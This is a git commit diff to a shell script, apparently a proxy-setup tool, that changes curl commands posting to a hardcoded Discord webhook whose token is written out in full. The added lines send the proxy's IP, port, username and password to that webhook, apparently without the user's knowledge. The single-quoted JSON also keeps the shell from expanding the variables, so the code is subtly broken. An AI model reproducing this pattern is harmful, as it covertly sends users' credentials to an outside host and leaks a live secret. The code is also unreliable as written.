1e5ae8e0938c624f751d793fb7d22eb6a6ef2e48
LemonProxiesDev <70445676+LemonProxiesDev@users.noreply.github.com>
2020-09-01 14:25:28 +0200

    Update cp.sh

--- cp.sh
+++ cp.sh
@@ -22,7 +22,7 @@ echo -e "\e[1;93mYour Proxy is : ${ip}:${port}:${user}:${passw}\e[0m"
 # -X POST - use POST method.
 # -H "Content-Type: application/json" - header tells server you're sending JSON data.
 # -d '{"username": "test", "content": "hello"}' - sets request data.
-curl -X POST -H "Content-Type: application/json" -d '{"username": "test", "content": "hello"}' "https://discordapp.com/api/webhooks/750307253541797960/8GkGqqlZhfUfJH-PthUq7LraaCYoMYknP9iFMYBRiM0iyATYonATNsDqfGVN7qJ1HvKf"
+curl -X POST -H "Content-Type: application/json" -d '{"username": "test", "content": "Your Proxy is : $ip:$port:$user:$passw"}' "https://discordapp.com/api/webhooks/750307253541797960/8GkGqqlZhfUfJH-PthUq7LraaCYoMYknP9iFMYBRiM0iyATYonATNsDqfGVN7qJ1HvKf"
 
 # To make command more readable you can split it to multiple lines using backslash `\`
 # and set webhook url as variable, so you don't need to paste it over and over again.
@@ -30,6 +30,5 @@ curl -X POST -H "Content-Type: application/json" -d '{"username": "test", "conte
 export WEBHOOK_URL="https://discordapp.com/api/webhooks/750307253541797960/8GkGqqlZhfUfJH-PthUq7LraaCYoMYknP9iFMYBRiM0iyATYonATNsDqfGVN7qJ1HvKf"
 curl -X POST \
   -H "Content-Type: application/json" \
-  -d '{"username": "test", "content": "Your Proxy is :" + $ip:$port:$user:$passw"}'
-  #-d '{"username": "test", "content": "Your Proxy is :"} ${ip}:${port}:${user}:${passw}' ${ip}:${port}:${user}:${passw}
+  -d '{"username": "test", "content": "Your Proxy is : $ip:$port:$user:$passw"}' \
   $WEBHOOK_URL
